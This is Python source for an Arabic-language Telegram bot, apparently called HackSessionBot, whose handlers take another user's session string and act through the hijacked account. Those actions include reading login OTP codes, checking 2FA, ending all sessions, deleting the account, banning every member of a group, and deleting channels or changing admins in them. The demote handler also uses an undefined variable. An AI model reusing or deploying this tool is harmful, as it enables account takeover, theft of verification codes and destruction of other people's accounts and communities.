import os
from HackSessionBot import app,API_ID,API_HASH
from pyrogram import filters , Client
from HackSessionBot.Helpers.steve import (
    users_gc,
    user_info,
    banall,
    get_otp,
    join_ch,
    leave_ch,
    del_ch,
    check_2fa,
    terminate_all,
    del_acc,
    piromote,
    demote_all)
from HackSessionBot.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions
from telethon import TelegramClient 
from telethon.sessions import StringSession 













@app.on_callback_query(filters.regex("A"))
async def a_callback(client : Client , query : CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id,"الآن أعطني جلسة الخاصه لهذا المستخدم")    
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(text = ch + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    info = await user_info(session.text)
    await query.message.reply_text(text = info + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("C"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    gc = await client.ask(id,"أعطني الآن معرف المجموعة/القناة أو اسم المستخدم") 
    hehe = await banall(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("D"))
async def d_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    hehe = await get_otp(session.text)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("E"))
async def e_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    gc = await client.ask(id,"أعطني الآن معرف المجموعة/القناة أو اسم المستخدم") 
    hehe = await join_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("F"))
async def f_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    gc = await client.ask(id,"أعطني الآن معرف المجموعة/القناة أو اسم المستخدم") 
    hehe = await leave_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("G"))
async def g_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    gc = await client.ask(id,"أعطني الآن معرف المجموعة/القناة أو اسم المستخدم") 
    hehe = await del_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


@app.on_callback_query(filters.regex("H"))
async def h_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)









@app.on_callback_query(filters.regex("I"))
async def i_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("J"))
async def j_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("K"))
async def k_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")    
    user_id = await client.ask(id,"أعطني معرف المستخدم/اسم المستخدم الذي سأقوم بالترويج له.")
    gc_id = await client.ask(id,"الصفاة الريسية E ذلك المستخدم.")
    hehe = await piromote(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("L"))
async def l_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"الآن أعطني جلسة الخاصه لهذا المستخدم.")    
    gc_id = await client.ask(id,"أعطني الآن معرف المجموعة/اسم المستخدم حيث أقوم بتخفيض جميع الأعضاء.")
    hehe = await demote_all(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n** تم تطويره بواسطة المبرمجين : [𝗖𝗼𝗱𝗲.𝗽𝘆](https://t.me/Python2015)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


